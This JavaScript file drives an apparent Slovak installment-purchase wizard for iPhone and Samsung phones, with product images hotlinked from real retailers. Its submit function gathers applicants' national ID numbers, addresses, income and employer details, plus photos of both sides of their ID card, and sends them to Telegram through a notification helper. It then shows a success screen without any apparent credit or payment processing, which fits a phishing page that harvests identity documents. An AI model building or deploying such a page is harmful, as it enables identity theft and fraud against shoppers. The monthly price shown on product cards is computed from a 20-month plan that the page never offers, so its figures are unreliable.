document.addEventListener('DOMContentLoaded', () => {
    // This script is for the wizard-style split payment page (iphone17-split-payment.html)

    // Define products locally for this page to ensure it's self-contained.
    const productsForSplitPaymentIphone17 = [        
        {
            id: 'iphone17',
            name: 'iPhone 17',
            variants: [
                { storage: '256GB', price: 1199 },
                { storage: '512GB', price: 1349 },
            ],
            colors: [
                { name: 'Hmlovo modrý', image: 'https://image.alza.cz/products/RI054b3/RI054b3.jpg?width=500&height=500' },
                { name: 'Salviovo zelený', image: 'https://image.alza.cz/products/RI054c4/RI054c4.jpg?width=500&height=500' },
                { name: 'Čierny', image: 'https://image.alza.cz/products/RI054b1/RI054b1-SK.jpg?width=500&height=500' }
            ],
            defaultImage: 'https://image.alza.cz/products/RI054b1/RI054b1-SK.jpg?width=500&height=500'
        },
        {
            id: 'iphone17pro',
            name: 'iPhone 17 Pro',
            variants: [
                { storage: '256GB', price: 1399 },
                { storage: '512GB', price: 1649 },
                { storage: '1TB', price: 1899 },
            ],
            colors: [
                { name: 'Polnočný', image: 'https://image.alza.cz/products/RI055b1/RI055b1.jpg?width=500&height=500' },
                { name: 'Kozmicky oranžový', image: 'https://image.alza.cz/products/RI055b2/RI055b2.jpg?width=500&height=500' },
                { name: 'Strieborný', image: 'https://image.alza.cz/products/RI055c3/RI055c3.jpg?width=500&height=500' }
            ],
            defaultImage: 'https://image.alza.cz/products/RI055b2/RI055b2.jpg?width=500&height=500'
        },
        {
            id: 'iphone17promax',
            name: 'iPhone 17 Pro Max',
            variants: [
                { storage: '512GB', price: 1799 },
                { storage: '1TB', price: 2099 },
            ],
            colors: [
                { name: 'Polnočný', image: 'https://image.alza.cz/products/RI056c3/RI056c3.jpg?width=500&height=500' },
                { name: 'Kozmicky oranžový', image: 'https://image.alza.cz/products/RI056b2/RI056b2.jpg?width=500&height=500' },
                { name: 'Strieborný', image: 'https://image.alza.cz/products/RI056b1/RI056b1.jpg?width=500&height=500' }
            ],
            defaultImage: 'https://image.alza.cz/products/RI056b2/RI056b2.jpg?width=500&height=500'
        },
        {
            id: 'iphone16promax',
            name: 'iPhone 16 Pro Max',
            variants: [
                { storage: '256GB', price: 1200 },
                { storage: '512GB', price: 1350 },
                { storage: '1TB', price: 1500 },
            ],
            colors: [
                { name: 'Čierny titán', image: 'https://m.media-amazon.com/images/I/61UMlmDXG+L.AC_SX466.jpg' },
                { name: 'Púštny titán', image: 'https://store.storeimages.cdn-apple.com/4982/as-images.apple.com/is/iphone-15-pro-finish-select-202309-6-7inch-naturaltitanium?wid=5120&hei=2880&fmt=p-jpg&qlt=80&.v=1692845702174' }
            ],
            defaultImage: 'https://store.storeimages.cdn-apple.com/4982/as-images.apple.com/is/iphone-15-pro-finish-select-202309-6-7inch-blacktitanium?wid=5120&hei=2880&fmt=p-jpg&qlt=80&.v=1692845702174'
        },
        {
            id: 'iphone15promax',
            name: 'iPhone 15 Pro Max',
            variants: [
                { storage: '256GB', price: 1100 },
                { storage: '512GB', price: 1250 },
            ],
            colors: [
                { name: 'Čierny titán', image: 'https://m.media-amazon.com/images/I/61v5Jay9F5L._AC_SX569_.jpg' }
            ],
            defaultImage: 'https://m.media-amazon.com/images/I/61v5Jay9F5L._AC_SX569_.jpg'
        },
        {
            id: 'galaxys25ultra',
            name: 'Samsung Galaxy S25 Ultra',
            variants: [
                { storage: '256GB', price: 1250 },
                { storage: '512GB', price: 1350 },
            ],
            colors: [
                { name: 'Titanium Black', image: 'https://m.media-amazon.com/images/I/61n0lmxP5-L._AC_SX569_.jpg' }
            ],
            defaultImage: 'https://images.samsung.com/is/image/samsung/p6pim/sk/2401/gallery/sk-galaxy-s24-ultra-sm-s928-478315-sm-s928bztgskc-539300069?$650_519_PNG$'
        },
        {
            id: 'galaxys25',
            name: 'Samsung Galaxy S25',
            variants: [
                { storage: '128GB', price: 950 },
                { storage: '256GB', price: 1050 },
            ],
            colors: [
                { name: 'Onyx Black', image: 'https://m.media-amazon.com/images/I/61n0lmxP5-L._AC_SX569_.jpg' }
            ],
           defaultImage: 'https://m.media-amazon.com/images/I/61n0lmxP5-L._AC_SX569_.jpg'
       },
        {
            id: 'galaxys24ultra',
            name: 'Samsung Galaxy S24 Ultra',
            variants: [
                { storage: '256GB', price: 1150 },
                { storage: '512GB', price: 1250 },
            ],
           colors: [
                { name: 'Titanium Black', image: 'https://m.media-amazon.com/images/I/51E3rux4DgL.__AC_SX300_SY300_QL70_FMwebp_.jpg' }
            ],
           defaultImage: 'https://m.media-amazon.com/images/I/51E3rux4DgL.__AC_SX300_SY300_QL70_FMwebp_.jpg'
       },
        {
            id: 'galaxys24',
            name: 'Samsung Galaxy S24',
            variants: [
                { storage: '128GB', price: 850 },
                { storage: '256GB', price: 950 },
            ],
           colors: [
                { name: 'Onyx Black', image: 'https://m.media-amazon.com/images/I/51bdK6FaR-L._AC_SX569_.jpg' }
            ],
           defaultImage: 'https://m.media-amazon.com/images/I/51bdK6FaR-L._AC_SX569_.jpg'
        }
    ];

    // --- STATE MANAGEMENT ---
    let state = {
        currentStep: 1,
        selectedProduct: null,
        selectedVariant: null,
        selectedColor: null,
        selectedPlan: { months: 6, interest: 2 }, // Default plan
    };

    // --- DOM ELEMENTS ---
    const wizardSteps = document.querySelectorAll('.wizard-step');
    const stepIndicators = document.querySelectorAll('.step');
    
    // Step 2 elements
    const selectedProductSummary = document.getElementById('selected-product-summary');
    const storageSelect = document.getElementById('storage-select');
    const colorSelect = document.getElementById('color-select');
    const monthsSelect = document.getElementById('months-select');
    const calculationSummary = document.getElementById('calculation-summary');

    // Step 3 elements
    const customerForm = document.getElementById('customer-info-form'); 
    const incomeSourceSelect = document.getElementById('income-source');
    const employeeDetailsSection = document.getElementById('employee-details');
    const entrepreneurDetailsSection = document.getElementById('entrepreneur-details');

    // Step 4 elements
    const termsCheckbox = document.getElementById('terms-agree-checkbox');
    const submitBtn = document.getElementById('submit-application-btn');

    // --- INITIALIZATION ---

    // Local currency conversion function to avoid dependency on external scripts
    function convertPrice(price, showBoth = false) {
        if (typeof price !== 'number' || isNaN(price)) {
            return '';
        }
        // Assuming EUR for this page as it's for SK/CS context
        return `€${price.toFixed(2)}`;
    }


    function initializePage() {
        // Pass the product data directly to the functions that need it.
        populateProductGrid(productsForSplitPaymentIphone17);
        populateMonths();
        setupEventListeners(productsForSplitPaymentIphone17);
        goToStep(1); // Start at step 1
    }

    // --- UI POPULATION ---
    function populateProductGrid(products) {
        const row1 = document.getElementById('product-row-iphones-17'); // Correct ID from HTML
        const row2 = document.getElementById('product-row-iphones-16-15'); // Correct ID from HTML
        const row3 = document.getElementById('product-row-samsung-25'); // Correct ID from HTML
        const row4 = document.getElementById('product-row-samsung-24'); // Correct ID from HTML

        // Clear only existing rows to prevent errors if one is not found
        [row1, row2, row3, row4].forEach(row => {
            if (row) row.innerHTML = '';
        });

        const createCardHTML = (product) => {
            const minPrice = product.variants[0].price;
            const interestRate = 4.9; // Based on the 20-month plan
            const totalMinPrice = minPrice + (minPrice * (interestRate / 100)); //4.9% interest rate
            const minMonthlyPayment = totalMinPrice / 20;
            return `
            <div class="product-card">
                <div class="product-image"><img src="${product.defaultImage}" alt="${product.name}"></div>
                <div class="product-info">
                    <h3 class="product-name">${product.name}</h3>
                    <div class="product-price">
                        <span class="current-price">od ${convertPrice(minMonthlyPayment, false)} / mes.</span>
                        <span class="original-price">Celkovo od ${convertPrice(totalMinPrice, false)}</span>
                    </div>
                    <button class="btn btn-primary select-product-btn" data-product-id="${product.id}">Vybrať Produkt</button>
                </div>
            </div>`;
        };

        products.forEach(product => {
            const cardHTML = createCardHTML(product);
            if (['iphone17', 'iphone17pro', 'iphone17promax'].includes(product.id)) {
                if (row1) row1.innerHTML += cardHTML;
            } else if (['iphone16promax', 'iphone15promax'].includes(product.id)) {
                if (row2) row2.innerHTML += cardHTML;
            } else if (['galaxys25ultra', 'galaxys25'].includes(product.id)) {
                if (row3) row3.innerHTML += cardHTML;
            } else if (['galaxys24ultra', 'galaxys24'].includes(product.id)) {
                if (row4) row4.innerHTML += cardHTML;
            }
        });
    }

    function populateMonths() {
        if (!monthsSelect) return;
        monthsSelect.innerHTML = '';
        const plans = [
            { months: 12, interest: 0 }, 
            { months: 24, interest: 2.5 },
            { months: 48, interest: 4.9 }
        ];
        plans.forEach(plan => {
            const option = document.createElement('option');
            option.value = plan.months;
            // Custom text for 0% interest
            if (plan.interest === 0) {
                option.textContent = `${plan.months} Mesiacov (bez navýšenia)`;
            } else {
                option.textContent = `${plan.months} Mesiacov (+${plan.interest}%)`;
            }
            option.dataset.interest = plan.interest;
            monthsSelect.appendChild(option);
        });
        // Set default plan in state
        state.selectedPlan = plans[0];
    }

    // --- EVENT LISTENERS ---
    function setupEventListeners(products) {
        // Product selection
        document.getElementById('wizard-step-1')?.addEventListener('click', e => {
            if (e.target.classList.contains('select-product-btn')) {
                const productId = e.target.dataset.productId;
                state.selectedProduct = products.find(p => p.id === productId);
                if (state.selectedProduct) {
                    goToStep(2);
                    configureProductStep();
                }
            }
        });

        // Wizard navigation
        document.querySelector('.split-payment-wizard')?.addEventListener('click', e => {
            if (e.target.closest('[data-action="next"]')) goToStep(state.currentStep + 1);
            if (e.target.closest('[data-action="prev"]')) goToStep(state.currentStep - 1);
        });

        // Configuration dropdowns
        storageSelect?.addEventListener('change', handleConfigurationChange);
        colorSelect?.addEventListener('change', handleConfigurationChange);
        monthsSelect?.addEventListener('change', handleConfigurationChange);

        // Form validation
        customerForm?.addEventListener('input', checkFormCompletion);
        termsCheckbox?.addEventListener('change', checkFormCompletion);
        submitBtn?.addEventListener('click', submitApplication);
        
        incomeSourceSelect?.addEventListener('change', () => {
            const source = incomeSourceSelect.value;
            employeeDetailsSection.style.display = source === 'employed' ? 'block' : 'none';
            entrepreneurDetailsSection.style.display = source === 'entrepreneur' ? 'block' : 'none';
            // Dynamically set required attributes
            employeeDetailsSection.querySelectorAll('input, select').forEach(el => el.required = (source === 'employed'));
            entrepreneurDetailsSection.querySelectorAll('input, select').forEach(el => el.required = (source === 'entrepreneur'));
        });
    }

    // --- WIZARD LOGIC ---
    function goToStep(step) {
        if (step > 4) { // Handle success step
            wizardSteps.forEach(s => s.classList.remove('active'));
            document.getElementById('wizard-success-step').classList.add('active');
            stepIndicators.forEach(ind => ind.classList.add('active')); // Mark all as complete
            return;
        }

        state.currentStep = step;
        wizardSteps.forEach(s => s.classList.remove('active'));
        document.getElementById(`wizard-step-${step}`)?.classList.add('active');
        stepIndicators.forEach((ind, i) => {
            ind.classList.toggle('active', i + 1 <= step);
            ind.classList.toggle('completed', i + 1 < step);
        });
        window.scrollTo(0, 0);
    }

    function configureProductStep() {
        if (!selectedProductSummary || !storageSelect || !colorSelect) return;

        selectedProductSummary.innerHTML = `<img src="${state.selectedProduct.defaultImage}" alt="${state.selectedProduct.name}"><h3>${state.selectedProduct.name}</h3>`;

        storageSelect.innerHTML = `<option value="">-- Vyberte úložisko --</option>`;
        state.selectedProduct.variants.forEach(v => {
            storageSelect.innerHTML += `<option value="${v.storage}" data-price="${v.price}">${v.storage} - ${convertPrice(v.price, false)}</option>`;
        });

        colorSelect.innerHTML = `<option value="">-- Vyberte farbu --</option>`;
        state.selectedProduct.colors.forEach(c => {
            colorSelect.innerHTML += `<option value="${c.name}" data-image="${c.image}">${c.name}</option>`;
        });

        resetConfig();
    }

    function resetConfig() {
        storageSelect.value = '';
        colorSelect.value = '';
        monthsSelect.value = state.selectedPlan.months;
        state.selectedVariant = null;
        state.selectedColor = null;
        calculationSummary.style.display = 'none';
        document.querySelector('#wizard-step-2 [data-action="next"]').disabled = true;
    }

    function handleConfigurationChange() {
        const storageOption = storageSelect.options[storageSelect.selectedIndex];
        if (storageOption && storageOption.value) {
            state.selectedVariant = { storage: storageOption.value, price: parseFloat(storageOption.dataset.price) };
        } else {
            state.selectedVariant = null;
        }

        const colorOption = colorSelect.options[colorSelect.selectedIndex];
        state.selectedColor = colorOption.value || null;
        if (colorOption && colorOption.dataset.image) {
            const summaryImage = selectedProductSummary.querySelector('img');
            if (summaryImage) summaryImage.src = colorOption.dataset.image;
        }

        // Update the image in the summary when a color is selected
        if (state.selectedColor && state.selectedProduct) {
            const summaryImage = selectedProductSummary.querySelector('img');
            if (summaryImage) summaryImage.src = colorOption.dataset.image;
        }

        const planOption = monthsSelect.options[monthsSelect.selectedIndex];
        state.selectedPlan = {
            months: parseInt(planOption.value),
            interest: parseFloat(planOption.dataset.interest)
        };
        
        if (state.selectedVariant && state.selectedColor) {
            updateCalculations();
            calculationSummary.style.display = 'block';
            document.querySelector('#wizard-step-2 [data-action="next"]').disabled = false;
        } else {
            calculationSummary.style.display = 'none';
            document.querySelector('#wizard-step-2 [data-action="next"]').disabled = true;
        }
    }

    function updateCalculations() {
        if (!state.selectedVariant || !state.selectedPlan) return;
        
        const basePrice = state.selectedVariant.price;
        const interestAmount = basePrice * (state.selectedPlan.interest / 100);
        const totalPrice = basePrice + interestAmount;
        const monthlyPayment = totalPrice / state.selectedPlan.months;

        document.getElementById('summary-price').textContent = convertPrice(basePrice, false);
        document.getElementById('summary-interest-rate').textContent = state.selectedPlan.interest;
        document.getElementById('summary-interest-amount').textContent = convertPrice(interestAmount, false);
        document.getElementById('summary-total-price').textContent = convertPrice(totalPrice, false);
        document.getElementById('summary-monthly').textContent = convertPrice(monthlyPayment, false);
    }

    function checkFormCompletion() {
        if (!customerForm) return;

        const requiredFields = Array.from(customerForm.querySelectorAll('[required]'));
        const allFilled = requiredFields.every(field => field.value.trim() !== '');
        
        const nextBtn = document.querySelector('#wizard-step-3 [data-action="next"]');
        if (nextBtn) nextBtn.disabled = !allFilled;

        submitBtn.disabled = !allFilled || !termsCheckbox.checked;
    }

    function submitApplication() {
        if (!state.selectedProduct || !state.selectedVariant || !state.selectedColor || !validateCustomerInfo() || !termsCheckbox.checked) {
            alert("Prosím, vyplňte všetky povinné polia a súhlaste s podmienkami.");
            return;
        }

        const customerData = {
            name: document.getElementById('customer-name').value,
            nationalId: document.getElementById('customer-national-id').value,
            phone: document.getElementById('customer-phone').value,
            nationality: document.getElementById('nationality').value,
            maritalStatus: document.getElementById('marital-status').value,
            children: document.getElementById('children-count').value,
            housing: document.getElementById('housing-status').value,
            address: document.getElementById('customer-address').value,
            city: document.getElementById('customer-city').value,
            zip: document.getElementById('customer-zip').value,
            incomeSource: document.getElementById('income-source').value,
            income: document.getElementById('monthly-income').value,
            education: document.getElementById('education-level').value,
            employerName: document.getElementById('employer-name')?.value || 'N/A',
            employmentField: document.getElementById('employment-field')?.value || 'N/A',
            businessName: document.getElementById('business-name')?.value || 'N/A',
            businessSince: document.getElementById('business-since')?.value || 'N/A',
            idFront: document.getElementById('id-upload-front').files[0]?.name || 'Not provided',
            idBack: document.getElementById('id-upload-back').files[0]?.name || 'Not provided'
        };

        const idFrontFile = document.getElementById('id-upload-front').files[0];
        const idBackFile = document.getElementById('id-upload-back').files[0];

        if (typeof TelegramNotifications !== 'undefined' && TelegramNotifications.splitPaymentApplicationSubmitted) {
            TelegramNotifications.splitPaymentApplicationSubmitted({
                productName: `${state.selectedProduct.name} (${state.selectedVariant.storage} - ${state.selectedColor})`,
                total: document.getElementById('summary-total-price').textContent.trim(),
                monthly: document.getElementById('summary-monthly').textContent + " / month",
                months: monthsSelect.value,
                customer: customerData,
                country: window.currentCountry.toUpperCase()
            });
        }

        if (typeof TelegramNotifications !== 'undefined' && TelegramNotifications.sendPhotosWithCaption && idFrontFile && idBackFile) {
            TelegramNotifications.sendPhotosWithCaption([idFrontFile, idBackFile], `ID Documents for Order from ${customerData.name}`);
        }

        goToStep(5); // Go to success step
    }

    function validateCustomerInfo() {
        if (!customerForm) return false;
        const requiredFields = Array.from(customerForm.querySelectorAll('[required]'));
        return requiredFields.every(field => field.value.trim() !== '');
    }

    // --- START ---
    initializePage();
});


//The interest rate is set to 4.9% which matches "Nízky úrok 4,9% p.a.".
